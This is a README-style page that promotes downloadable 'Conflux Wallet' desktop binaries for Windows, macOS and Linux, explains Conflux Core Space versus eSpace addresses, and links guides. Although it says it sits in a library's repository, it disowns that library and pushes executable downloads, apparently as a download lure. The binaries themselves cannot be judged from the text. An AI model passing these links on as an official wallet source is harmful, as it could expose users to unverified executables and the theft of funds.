![Conflux Wallet](assets/banner-profile.png)

<h1 align="center">Conflux Wallet</h1>

<p align="center">One window for both Conflux spaces, so a send starts from the right address.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

---

## Downloads - v0.6.14

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14).

> Only download from this GitHub release page.

---

## Why Conflux Wallet on js-conflux-sdk

A transaction on Conflux begins with a question that most wallets leave you to answer from memory: which space is this address in? Core Space uses `cfx:` base32 addresses, eSpace uses `0x` hex, and the same phrase produces a different account in each. Send to the wrong one and the transfer does not fail politely; it goes somewhere you cannot reach from the account you are looking at.

Conflux Wallet answers that question on screen. The active space is labelled, the address is drawn in the format that belongs to it, and the balance shown is the balance of the account you are actually in. When a transfer is refused, the wallet usually tells you why in the space or the format rather than in the fee.

- Core Space and eSpace accounts kept separate, with separate balances and history.
- Addresses shown in `cfx:` or `0x` form according to the space you are in.
- A wrong-network or wrong-format send is visible before you confirm it.
- The same recovery phrase restores both accounts, in the right space, on any machine.

This repository sits alongside the wallet's own pages; the guides that walk through space and address problems are linked at the end.

## Who it is for

- You use eSpace contracts and need an account whose 0x address the site recognises.
- You send CFX regularly and want the space and the address format visible before you confirm.
- You restored on a new machine and the balance does not match what you remember.

## Your first ten minutes

1. Open the wallet and read the space label before anything else; it decides the address format you will see.
2. Compare the prefix of the address on screen with the one your recipient gave you.
3. Send a small test amount first when the destination is new, and keep the transaction hash.
4. Switch to the other space and note that the address changes; one phrase, two accounts.
5. Read the two-space guide once, then keep the address-format page for the next transfer.

## What this page covers, and what it does not

This page explains why one wallet shows two kinds of address and how to tell them apart before a transfer. It is not a developer page for this repository's library, and it does not document an API: the guides linked below cover the wallet's behaviour for the person using it. If a step here does not match what you see, check the version first, because an older build labels the active space in a different place.

## Questions before you download

### Why does the same wallet show two different addresses?

Because Conflux has two spaces. Core Space derives a cfx: address and eSpace derives a 0x address from the same phrase, and each holds its own balance. Neither is a mistake or a second wallet.

### Can I send CFX straight from Core Space to an eSpace address?

Not as an ordinary transfer. Moving value between the spaces goes through the network's cross-space mechanism, and the bridge guide names the steps and the fees for each direction.

### Which space do most dApps use?

eSpace, because it is EVM-compatible and contracts there expect 0x addresses. A dApp that asks for a cfx: address is asking for something else, and the connection guide explains the difference.

---

## Guides

<div align="center">

| Guide | What it covers |
|---|---|
| [Core Space vs eSpace](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md) | Core Space vs eSpace: the checks, in order, for the current desktop release. |
| [Conflux Address Formats](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-address-formats-cfx-vs-0x.md) | Conflux Address Formats: the checks, in order, for the current desktop release. |
| [CFX Sent to the Wrong Network](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/conflux-wallet-cfx-wrong-network.md) | CFX Sent to the Wrong Network: the checks, in order, for the current desktop release. |

</div>

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)

---

**Security:** download only from this release page, and never share a recovery phrase, private key, password or keystore file with anyone, including support.

## Support

Wallet help: support@confluxwallet.net. Business and legal: office@confluxwallet.net.

## License

MIT

[Main application](https://github.com/conflux-developments/conflux-desktop-wallet) - [Release v0.6.14](https://github.com/conflux-developments/conflux-desktop-wallet/releases/tag/v0.6.14) - [Guide index](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)
